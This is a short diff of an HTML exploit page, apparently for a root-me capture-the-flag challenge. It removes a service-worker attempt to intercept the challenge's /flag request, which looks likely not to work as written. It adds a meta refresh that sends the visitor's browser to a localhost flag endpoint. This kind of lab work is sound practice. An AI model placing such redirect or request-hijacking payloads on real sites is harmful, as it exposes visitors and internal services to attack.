@@ -1,17 +1,9 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-<script>
-if ('serviceWorker' in navigator) {
-  navigator.serviceWorker.register('data:text/javascript,'+btoa(`
-    self.onfetch = e => {
-      if (e.request.url.includes('challenge01.root-me.org:58007/flag')) {
-        e.respondWith(new Response('FLAG ICI', {headers:{'Content-Type':'text/html'}}));
-      }
-    }
-  `));
-}
-</script>
+    <meta http-equiv="refresh" content="0; url=http://127.0.0.1:5000/flag" />
 </head>
-<body>Refresh puis history.back()</body>
+<body>
+    <p>Redirection...</p>
+</body>
 </html>
